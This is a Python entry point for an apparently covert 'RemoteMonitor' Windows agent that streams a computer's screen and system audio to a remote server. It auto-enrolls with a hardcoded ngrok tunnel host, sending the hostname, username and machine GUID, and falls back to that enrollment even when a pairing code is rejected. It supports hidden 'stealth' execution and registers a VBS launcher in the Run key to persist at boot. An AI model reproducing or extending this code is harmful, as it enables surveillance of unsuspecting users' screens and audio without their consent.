"""
RemoteMonitor Desktop Agent — Main Service Entrypoint.
Windows Desktop Screen + Audio Streaming Daemon over WebRTC.
Requires: Python 3.11+, aiortc, PyAudioWPatch, DXGI/MSS, Windows DPAPI.
"""

import os
os.environ["OPENBLAS_NUM_THREADS"] = "1"
os.environ["MKL_NUM_THREADS"] = "1"
os.environ["OMP_NUM_THREADS"] = "1"
os.environ["NUMEXPR_NUM_THREADS"] = "1"

import sys
import time
import argparse
import asyncio
import signal
import socket
import getpass
import platform
import winreg
import urllib.parse
import requests
import numpy as np

DEFAULT_CANONICAL_SERVER = "https://trodden-wincing-dreamland.ngrok-free.dev"

import logging
from logging.handlers import RotatingFileHandler
from pathlib import Path

# Safe stdout/stderr redirection for windowless / stealth execution (pythonw.exe or SW_HIDE)
if sys.stdout is None:
    sys.stdout = open(os.devnull, "w")
if sys.stderr is None:
    sys.stderr = open(os.devnull, "w")

# Configure Agent Logging (Dual Output: Console + Rotating File)
LOG_DIR = Path(__file__).resolve().parent / "logs"
LOG_DIR.mkdir(parents=True, exist_ok=True)
LOG_FILE = LOG_DIR / "agent.log"

logger = logging.getLogger("RemoteMonitorAgent")
logger.setLevel(logging.INFO)

formatter = logging.Formatter("[%(asctime)s] [%(levelname)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")

# File handler (10MB per file, 5 backup files)
file_handler = RotatingFileHandler(LOG_FILE, maxBytes=10 * 1024 * 1024, backupCount=5, encoding="utf-8")
file_handler.setFormatter(formatter)
logger.addHandler(file_handler)

# Console handler (only if stdout is not devnull)
if hasattr(sys.stdout, 'write') and sys.stdout != open(os.devnull, "w"):
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setFormatter(formatter)
    logger.addHandler(console_handler)

# Redirect standard print to logger for seamless compatibility
def log_info(msg):
    logger.info(msg)

def log_warn(msg):
    logger.warning(msg)

def log_error(msg):
    logger.error(msg)

from crypto_storage import AgentCredentialStore


def get_machine_guid() -> str:
    """Read Windows MachineGuid from registry or generate consistent fallback."""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Cryptography",
            0,
            winreg.KEY_READ | winreg.KEY_WOW64_64KEY
        )
        val, _ = winreg.QueryValueEx(key, "MachineGuid")
        winreg.CloseKey(key)
        if val:
            return str(val).strip()
    except Exception:
        pass
    return f"{socket.gethostname()}-{getpass.getuser()}"


def auto_enroll_device(server_url: str, fps: int = 30) -> dict:
    """Auto-enroll device directly with server."""
    server_url = server_url.rstrip("/")
    hostname = socket.gethostname()
    username = getpass.getuser()
    machine_id = get_machine_guid()

    payload = {
        "hostname": hostname,
        "username": username,
        "machine_id": machine_id,
        "device_type": "desktop",
        "screen_resolution": "1920x1080",
        "fps": fps,
        "hardware_info": {
            "os": platform.platform(),
            "machine_id": machine_id,
            "auto_enrolled": True,
            "hostname": hostname,
            "username": username
        },
        "user_agent": "RemoteMonitorAgent/2.0"
    }

    headers = {
        "ngrok-skip-browser-warning": "1",
        "User-Agent": "RemoteMonitorAgent/2.0",
        "Content-Type": "application/json"
    }

    try:
        res = requests.post(f"{server_url}/api/v1/device/auto-register", json=payload, headers=headers, timeout=12)
        if res.status_code == 200:
            data = res.json()
            device_info = data.get("device", {})
            token = data.get("token") or data.get("device_token")
            parsed = urllib.parse.urlparse(server_url)
            ws_url = f"wss://{parsed.hostname}" if server_url.startswith("https://") else f"ws://{parsed.hostname or '127.0.0.1'}:8080"
            cred = {
                "device_token": token,
                "device_identifier": device_info.get("device_identifier") or device_info.get("identifier"),
                "device_name": device_info.get("name"),
                "device_uuid": device_info.get("uuid"),
                "server_url": server_url,
                "ws_url": ws_url,
                "app_key": data.get("app_key") or "nw2zhrpowiazy7xm9esc",
                "paired_at": time.time(),
            }
            store = AgentCredentialStore()
            store.save_credentials(cred)
            return cred
    except Exception as e:
        logger.error(f"Auto-enroll network error: {e}")
    return None


def cmd_pair(args):
    """Pair desktop using ticket code or auto-enroll."""
    server_url = (args.server or DEFAULT_CANONICAL_SERVER).rstrip("/")
    code = (args.code or "").strip().upper()

    headers = {
        "ngrok-skip-browser-warning": "1",
        "User-Agent": "RemoteMonitorAgent/2.0"
    }

    if not code or code in ["AUTO", "NONE", "DEFAULT"]:
        print(f"[Agent] Auto-enrolling with server at {server_url} ...")
        cred = auto_enroll_device(server_url)
        if cred:
            print("\n" + "="*60)
            print("  DESKTOP ENROLLED SUCCESSFULLY")
            print("="*60)
            print(f"  Device Identifier : {cred['device_identifier']}")
            print(f"  Device UUID       : {cred['device_uuid']}")
            print(f"  Server URL        : {cred['server_url']}")
            print("="*60)
            return
        else:
            print(f"[Agent] Auto-enrollment failed.", file=sys.stderr)
            sys.exit(1)

    print(f"[Agent] Pairing with server at {server_url} using code '{code}' ...")
    pair_url = f"{server_url}/api/v1/device/pair"

    try:
        res = requests.post(pair_url, json={"pairing_code": code}, headers=headers, timeout=10)
        if res.status_code != 200:
            print(f"[Agent] Pairing code rejected (HTTP {res.status_code}). Trying Auto-Enrollment...")
            cred = auto_enroll_device(server_url)
            if cred:
                print(f"[Agent] Auto-enrollment succeeded as {cred.get('device_identifier')} ({cred.get('device_name')})")
                return
            sys.exit(1)

        json_res = res.json()
        if not json_res.get("success") or "data" not in json_res:
            print(f"[Agent] Pairing rejected: {json_res.get('message')}. Trying Auto-Enrollment...")
            cred = auto_enroll_device(server_url)
            if cred:
                print(f"[Agent] Auto-enrollment succeeded as {cred.get('device_identifier')} ({cred.get('device_name')})")
                return
            sys.exit(1)

        payload = json_res["data"]
        device_info = payload.get("device", {})

        server_host = urllib.parse.urlparse(server_url).hostname or "localhost"
        if server_url.startswith("https://"):
            default_ws = f"wss://{server_host}"
        else:
            default_ws = f"ws://{server_host}:8080"

        credential = {
            "server_url": server_url,
            "ws_url": getattr(args, "ws", None) or payload.get("ws_url") or default_ws,
            "app_key": payload.get("app_key") or "nw2zhrpowiazy7xm9esc",
            "device_uuid": device_info.get("uuid"),
            "device_identifier": device_info.get("device_identifier") or device_info.get("identifier"),
            "device_name": device_info.get("name"),
            "device_type": device_info.get("device_type", "desktop"),
            "device_token": payload.get("device_token"),
            "paired_at": time.time(),
        }

        store = AgentCredentialStore()
        store.save_credentials(credential)

        print("\n" + "="*60)
        print("  DESKTOP PAIRED SUCCESSFULLY")
        print("="*60)
        print(f"  Device Identifier : {credential['device_identifier']}")
        print(f"  Device UUID       : {credential['device_uuid']}")
        print(f"  Device Name       : {credential['device_name']}")
        print(f"  Token Storage     : Encrypted with Windows DPAPI")
        print("="*60)

    except Exception as e:
        print(f"[Agent] Pairing network error ({e}). Attempting Auto-Enrollment...")
        cred = auto_enroll_device(server_url)
        if cred:
            print(f"[Agent] Auto-enrollment succeeded as {cred.get('device_identifier')} ({cred.get('device_name')})")
            return
        sys.exit(1)


def cmd_status(args):
    """Check agent pairing status, identity, and capture devices."""
    print("="*60)
    print("  REMOTEMONITOR DESKTOP AGENT DIAGNOSTICS")
    print("="*60)
    print(f"  Python Version    : {sys.version.split()[0]}")
    print(f"  Python Executable : {sys.executable}")

    store = AgentCredentialStore()
    cred = store.load_credentials()

    if not cred:
        print("  Credentials       : None found. Run 'python agent.py pair --code <code>' first.")
    else:
        print(f"  Identifier        : {cred.get('device_identifier')}")
        print(f"  UUID              : {cred.get('device_uuid')}")
        print(f"  Server URL        : {cred.get('server_url')}")
        print(f"  WS URL            : {cred.get('ws_url')}")

        # Test server connectivity
        try:
            res = requests.get(
                f"{cred.get('server_url')}/api/v1/device/me",
                headers={
                    "Authorization": f"Bearer {cred.get('device_token')}",
                    "ngrok-skip-browser-warning": "1",
                    "User-Agent": "RemoteMonitorAgent/2.0"
                },
                timeout=5
            )
            if res.status_code == 200:
                dev_info = res.json().get("device", {})
                print(f"  Server Auth       : VALID (Status: {dev_info.get('status')}, Stream: {dev_info.get('stream_status')})")
            else:
                print(f"  Server Auth       : FAILED (HTTP {res.status_code})")
        except Exception as e:
            print(f"  Server Auth       : UNREACHABLE ({e})")

    # Check screen & audio
    try:
        from capture_screen import ScreenCapture
        screen = ScreenCapture()
        w, h = screen.get_resolution()
        print(f"  Screen Display    : {w}x{h} ({screen.engine_name})")
        screen.close()
    except Exception as e:
        print(f"  Screen Display    : Initializing/Unavailable ({e})")

    try:
        from capture_audio import AudioCapture
        audio = AudioCapture()
        print(f"  System Audio      : {audio.engine_name}")
        print(f"  Audio Device      : {audio.device_name}")
        audio.close()
    except Exception as e:
        print(f"  System Audio      : Initializing/Unavailable ({e})")
    print("="*60)



def cmd_test_capture(args):
    """Test screen & audio capture pipeline and print metrics."""
    print("[Agent] Testing Screen Capture ...")
    from capture_screen import ScreenCapture
    from capture_audio import AudioCapture
    screen = ScreenCapture(target_fps=30)
    w, h = screen.get_resolution()
    t0 = time.time()
    frames = []
    for _ in range(15):
        frame = screen.capture_frame()
        frames.append(frame)
        time.sleep(0.033)
    elapsed = time.time() - t0
    fps = 15.0 / elapsed
    std_dev = np.std(frames[0]) if frames else 0.0
    print(f"  [OK] Screen: Captured 15 frames at {w}x{h}, average {fps:.1f} FPS (Engine: {screen.engine_name})")
    print(f"  [OK] Screen pixel variation (std dev): {std_dev:.2f}")
    screen.close()

    print("\n[Agent] Testing WASAPI Loopback Audio Capture ...")
    audio = AudioCapture()
    time.sleep(0.1)
    samples = []
    for _ in range(15):
        chunk = audio.read_frame_samples()
        samples.append(chunk)
        time.sleep(0.02)
    audio.close()

    all_samples = np.vstack(samples)
    rms = np.sqrt(np.mean(all_samples.astype(np.float64)**2))
    print(f"  [OK] Audio: Captured {len(all_samples)} samples (48kHz Stereo), RMS level: {rms:.1f}")
    print(f"  [OK] Audio device: {audio.device_name} (Engine: {audio.engine_name})")
    print("\nCapture test completed successfully.")


def cmd_autostart(args):
    """Configure Windows Run registry key for automatic startup on boot."""
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    app_name = "RemoteMonitorDesktopAgent"
    
    agent_dir = Path(__file__).resolve().parent
    vbs_launcher = agent_dir / "run_stealth_autostart.vbs"
    
    if vbs_launcher.exists():
        command = f'wscript.exe "{vbs_launcher}"'
    else:
        python_exe = sys.executable
        script_path = os.path.abspath(__file__)
        command = f'"{python_exe}" "{script_path}" start'

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
        if args.enable:
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, command)
            print(f"[Agent] Autostart ENABLED in Windows Registry: {command}")
        elif args.disable:
            try:
                winreg.DeleteValue(key, app_name)
                print("[Agent] Autostart DISABLED.")
            except FileNotFoundError:
                print("[Agent] Autostart was not configured.")
        winreg.CloseKey(key)
    except Exception as e:
        print(f"[Agent] Error updating registry: {e}", file=sys.stderr)


async def _async_start(fps: int, server_override: str = None, ws_override: str = None):
    """Async main daemon execution."""
    store = AgentCredentialStore()
    cred = store.load_credentials()

    server_url = (server_override or os.getenv("REMOTEMONITOR_SERVER_URL") or (cred.get("server_url") if cred else None) or DEFAULT_CANONICAL_SERVER).rstrip("/")

    # If cred is missing or points to a different server URL or missing token, auto-enroll fresh:
    if not cred or cred.get("server_url") != server_url or not cred.get("device_token"):
        print(f"[Agent] Auto-enrolling with server: {server_url} ...")
        cred = auto_enroll_device(server_url, fps=fps)
        if not cred:
            print("[Agent] Error: Could not enroll with server. Please check internet connection.", file=sys.stderr)
            sys.exit(1)

    if server_url and server_url.startswith("https://"):
        parsed_srv = urllib.parse.urlparse(server_url)
        ws_url = ws_override or f"wss://{parsed_srv.hostname}"
    else:
        ws_url = ws_override or os.getenv("REMOTEMONITOR_WS_URL") or cred.get("ws_url")
    app_key = cred.get("app_key") or cred.get("reverb_app_key") or os.getenv("REVERB_APP_KEY", "nw2zhrpowiazy7xm9esc")
    device_uuid = cred.get("device_uuid") or cred.get("uuid")
    device_token = cred.get("device_token") or cred.get("token")
    identifier = cred.get("device_identifier") or cred.get("identifier")

    print("\n" + "="*60)
    print("  REMOTEMONITOR DESKTOP STREAMING DAEMON RUNNING")
    print("="*60)
    print(f"  Device Identifier : {identifier}")
    print(f"  Device UUID       : {device_uuid}")
    print(f"  Python Bin        : {sys.executable}")
    print(f"  Target FPS        : {fps}")
    print(f"  Signalling Server : {server_url}")
    print(f"  WebSocket Channel : private-device.{device_uuid}")
    from stream_manager import StreamManager
    from reverb_signalling import ReverbSignallingClient

    stream_manager = StreamManager(server_url, device_token, device_uuid=device_uuid, fps=fps)
    signalling = ReverbSignallingClient(
        server_url=server_url,
        ws_url=ws_url,
        app_key=app_key,
        device_uuid=device_uuid,
        device_token=device_token,
        on_event_callback=stream_manager.handle_signalling_event
    )

    try:
        await signalling.run()
    except asyncio.CancelledError:
        pass
    finally:
        print("[Agent] Shutting down stream manager and capture engines...")
        await stream_manager.close_all()


def cmd_start(args):
    """Start desktop agent daemon."""
    fps = args.fps or 30
    server_override = getattr(args, "server", None)
    ws_override = getattr(args, "ws", None)
    try:
        asyncio.run(_async_start(fps, server_override=server_override, ws_override=ws_override))
    except KeyboardInterrupt:
        print("\n[Agent] Stopped by user.")


def main():
    parser = argparse.ArgumentParser(description="RemoteMonitor Windows Desktop Streaming Agent")
    subparsers = parser.add_subparsers(dest="command", help="Command to execute")

    # pair
    p_pair = subparsers.add_parser("pair", help="Pair desktop with server using ticket code")
    p_pair.add_argument("--code", required=True, help="6-character pairing code from admin")
    p_pair.add_argument("--server", default=os.getenv("REMOTEMONITOR_SERVER_URL", "http://localhost:8000"), help="Laravel server base URL")
    p_pair.add_argument("--ws", default=os.getenv("REMOTEMONITOR_WS_URL"), help="Reverb WebSocket URL")

    # start
    p_start = subparsers.add_parser("start", help="Start the streaming daemon")
    p_start.add_argument("--fps", type=int, default=30, help="Target capture FPS (default: 30)")
    p_start.add_argument("--server", default=os.getenv("REMOTEMONITOR_SERVER_URL"), help="Override signalling server base URL")
    p_start.add_argument("--ws", default=os.getenv("REMOTEMONITOR_WS_URL"), help="Override Reverb WebSocket URL")

    # status
    subparsers.add_parser("status", help="Show agent credentials and system status")

    # test-capture
    subparsers.add_parser("test-capture", help="Test screen & audio capture pipeline")

    # autostart
    p_auto = subparsers.add_parser("autostart", help="Configure Windows startup execution")
    p_auto.add_argument("--enable", action="store_true", help="Enable startup on Windows boot")
    p_auto.add_argument("--disable", action="store_true", help="Disable startup on Windows boot")

    args = parser.parse_args()

    if args.command == "pair":
        cmd_pair(args)
    elif args.command == "start":
        cmd_start(args)
    elif args.command == "status":
        cmd_status(args)
    elif args.command == "test-capture":
        cmd_test_capture(args)
    elif args.command == "autostart":
        cmd_autostart(args)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
